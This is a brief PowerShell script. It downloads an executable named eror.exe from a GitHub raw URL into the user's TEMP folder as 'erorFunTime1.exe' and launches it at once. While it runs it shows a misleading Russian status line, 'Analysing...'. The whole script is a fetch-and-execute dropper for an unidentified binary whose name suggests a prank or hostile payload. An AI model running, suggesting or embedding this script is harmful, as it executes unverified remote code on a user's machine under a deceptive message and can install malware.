$ErrorActionPreference = "Stop"
$Host.UI.RawUI.WindowTitle = "Eror"

$url = "https://raw.githubusercontent.com/hal0151/erorft/refs/heads/main/eror.exe"
$path = Join-Path $env:TEMP "erorFunTime1.exe"

try {
    Write-Host "Анализирую..." -ForegroundColor Green
    Invoke-WebRequest -Uri $url -OutFile $path
    Start-Process -FilePath $path
    Write-Host "Eror запущен" -ForegroundColor Green
}
catch {
    Write-Host "Ошибка запуска Eror" -ForegroundColor Red
}
